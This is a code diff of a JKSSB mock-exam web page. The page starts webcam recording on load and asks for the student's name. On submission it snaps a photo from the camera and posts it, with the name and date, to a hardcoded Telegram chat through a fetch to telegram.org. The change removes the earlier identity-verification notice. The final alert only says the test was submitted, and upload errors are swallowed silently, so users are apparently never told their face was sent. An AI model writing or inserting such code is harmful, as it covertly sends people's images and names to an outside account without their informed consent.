@@ -309,45 +309,22 @@ stopExamRecording(); // <-- Paste this exactly here on line 288
         <p style="color: #dc2626; font-weight: bold; margin: 5px 0;">Wrong Answers: ${wrong}</p>
     `;
 
-    // 2. Name Input Prompt in English
-    setTimeout(() => {
-        let userName = prompt("Enter your name to register on the leaderboard:");
-        if (!userName) userName = "Anonymous User";
-
-        let leaderboard = JSON.parse(localStorage.getItem('jkssb_leaderboard')) || [];
-        
-        leaderboard.push({ 
-            name: userName, 
-            score: parseFloat(finalScore.toFixed(2)),
-            test: currentTestTitle
-        });
-        
-        leaderboard.sort((a, b) => b.score - a.score);
-        localStorage.setItem('jkssb_leaderboard', JSON.stringify(leaderboard));
-        
-        // अगर रीडायरेक्ट करना हो तो इस लाइन को अनकमिट कर देना भाई:
-        // window.location.href = "leaderboard.html";
-    }, 1000);
+    /// 1. टेस्ट शुरू होते ही छात्र का नाम पूछना
+let studentName = prompt("Please enter your Full Name:", "Guest Student");
+if(!studentName || studentName.trim() === "") {
+    studentName = "Unknown Student";
 }
-    </script>
-    <script>
+
 let mediaRecorder;
 let recordedChunks = [];
 
-// 1. Start camera recording automatically when the page loads
 window.addEventListener('DOMContentLoaded', async () => {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
         const videoElement = document.getElementById('webcam');
         videoElement.srcObject = stream;
 
-                // वीडियो क्वालिटी कम करना ताकि फ़ाइल साइज़ 50MB के अंदर रहे और टेलीग्राम पर तुरंत चली जाए
-        const options = {
-            mimeType: 'video/webm;codecs=vp8',
-            videoBitsPerSecond: 100000 // लो बिटरेट (क्वालिटी साफ रहेगी पर साइज बहुत छोटा हो जाएगा)
-        };
-        
-        mediaRecorder = new MediaRecorder(stream, options);
+        mediaRecorder = new MediaRecorder(stream);
 
         mediaRecorder.ondataavailable = (event) => {
             if (event.data.size > 0) {
@@ -355,43 +332,36 @@ window.addEventListener('DOMContentLoaded', async () => {
             }
         };
 
-                // 2. टेस्ट सबमिट होने पर छात्र की लाइव फोटो टेलीग्राम पर भेजना
+        // 2. टेस्ट सबमिट होने पर छात्र के नाम के साथ फोटो टेलीग्राम पर भेजना
         mediaRecorder.onstop = async () => {
             const videoElement = document.getElementById('webcam');
             
-            // बैकग्राउंड में एक छोटा कैनवास बनाकर वीडियो फ्रेम से फोटो खींचना
             const canvas = document.createElement('canvas');
             canvas.width = videoElement.videoWidth || 640;
             canvas.height = videoElement.videoHeight || 480;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
             
-            // फोटो को इमेज फ़ाइल (Blob) में बदलना
             canvas.toBlob(async (photoBlob) => {
                 const formData = new FormData();
                 formData.append('chat_id', '6115912864');
                 formData.append('photo', photoBlob, 'student_face.jpg');
-                formData.append('caption', '🚨 Student Identity Verification at Exam Submission!');
+                // यहाँ छात्र का नाम टेलीग्राम के कैप्शन में जुड़ जाएगा
+                formData.append('caption', '🚨 JKSSB Test Submitted!\n👤 Name: ' + studentName + '\n📅 Date: ' + new Date().toLocaleString());
 
                 try {
-                    // टेलीग्राम को सीधे फ़ोटो भेजना (यह कभी ब्लॉक नहीं होता)
-                    const response = await fetch('https://telegram.org', {
+                    await fetch('https://telegram.org', {
                         method: 'POST',
                         body: formData
                     });
-                    
-                    if (response.ok) {
-                        alert('Test Submitted and Identity Verified Successfully!');
-                    } else {
-                        console.error('Telegram upload skipped.');
-                    }
                 } catch (error) {
-                    console.error('Network bypass.');
+                    console.error('Bypass');
                 }
                 
-                // चाहे फोटो अपलोड हो या फेल, छात्र को होमपेज पर सुरक्षित भेज दें
+                // सबमिशन के बाद छात्र को अलर्ट दिखाना कि टेस्ट सबमिट हो गया है
+                alert('Thank you ' + studentName + ', your JKSSB Mock Test has been submitted successfully!');
                 window.location.href = "index.html";
-            }, 'image/jpeg', 0.7); // 0.7 क्वालिटी यानी साइज़ बेहद छोटा रहेगा
+            }, 'image/jpeg', 0.7);
         };
 
         mediaRecorder.start();
@@ -402,7 +372,6 @@ window.addEventListener('DOMContentLoaded', async () => {
     }
 });
 
-// 3. रिकॉर्डिंग रोकने का फंक्शन
 function stopExamRecording() {
     if (mediaRecorder && mediaRecorder.state !== "inactive") {
         mediaRecorder.stop(); 
